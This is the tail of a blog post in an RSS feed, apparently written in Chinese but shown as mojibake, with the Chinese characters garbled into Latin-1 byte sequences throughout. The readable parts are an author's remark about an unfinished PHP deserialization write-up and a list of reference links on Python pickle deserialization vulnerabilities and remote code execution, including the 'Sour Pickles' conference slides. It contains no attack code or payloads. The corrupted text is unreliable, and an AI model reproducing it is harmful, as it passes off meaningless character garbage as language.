&lt;p>è‡ªå·±è¿˜æ˜¯æœ‰æƒ°æ€§å•Šï¼Œå…¶å®ååºåˆ—åŒ–ç¬¬ä¸€ç¯‡æ€»ç»“çš„æ˜¯phpï¼Œå¯æ˜¯åˆ°ç°åœ¨è¿˜æœ‰å‡ ä¸ªäºŒçº§æ ‡é¢˜ä¸‹é¢æ˜¯ç©ºç™½çš„â€¦â€¦åªèƒ½å…ˆç»™è‡ªå·±æ‰¾ä¸ªå€Ÿå£ï¼šphpååºåˆ—åŒ–çš„ä¸œè¥¿å®åœ¨æ˜¯å¤ªå¤šäº†TAT&lt;/p>
&lt;hr>
&lt;p>æœ€åæ”¾ä¸€ä¸‹å…¨ç¯‡ç”¨åˆ°çš„çš„å‚è€ƒæ–‡ç« ï¼ˆéƒ¨åˆ†å·²å†™åœ¨å¯¹åº”æ ‡é¢˜ä¸‹é¢ï¼‰ï¼Œä¸åˆ†å…ˆå~&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/wjrblogs/p/14057784.html">Python ååºåˆ—åŒ–æ¼æ´å­¦ä¹ ç¬”è®°&lt;/a> | &lt;a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ Python ååºåˆ—åŒ–æ¼æ´&lt;/a> | &lt;a href="https://xz.aliyun.com/t/7436#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2">pickleååºåˆ—åŒ–åˆæ¢&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/188981#h2-10">Python pickle ååºåˆ—åŒ–å®ä¾‹åˆ†æ&lt;/a> | &lt;a href="https://segmentfault.com/a/1190000013099825">Python ååºåˆ—åŒ–å®‰å…¨é—®é¢˜ï¼ˆä¸€ï¼‰&lt;/a> - &lt;a href="https://segmentfault.com/a/1190000013214956">Python ååºåˆ—åŒ–å®‰å…¨é—®é¢˜ï¼ˆäºŒï¼‰&lt;/a> | &lt;a href="https://zhuanlan.zhihu.com/p/89132768">ä»é›¶å¼€å§‹pythonååºåˆ—åŒ–æ”»å‡»ï¼špickleåŸç†è§£æ &amp;amp; ä¸ç”¨reduceçš„RCEå§¿åŠ¿&lt;/a> | &lt;a href="https://blog.csdn.net/weixin_39929635/article/details/111003485">å…³äºPython secçš„ä¸€äº›ç®€å•çš„æ€»ç»“&lt;/a> | &lt;a href="https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2011/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">Sour Pickles A serialised exploitation guide in one part - Macro Slaviero&lt;/a> | &lt;a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#">ğŸ Security Issues in Python Pickle&lt;/a>&lt;/p></description></item></channel></rss>